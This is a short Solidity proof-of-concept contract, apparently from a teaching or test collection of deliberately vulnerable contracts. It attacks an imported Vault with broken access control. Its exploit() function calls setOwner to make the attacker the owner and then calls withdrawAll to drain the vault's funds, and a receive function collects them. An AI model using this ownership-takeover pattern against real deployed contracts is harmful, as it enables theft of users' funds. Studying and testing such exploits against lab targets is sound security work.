// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../vulnerable/access-control/Vault.sol";

contract VaultAttack {
  Vault public vault;
  address public attacker;

  constructor(address _vault) {
    vault = Vault(_vault);
    attacker = msg.sender;
  }

  function exploit() external {
  // become owmner
    vault.setOwner(attacker);
    // withdraw all funds
    vault.withdrawAll();
  }

  receive() external payable {}
}
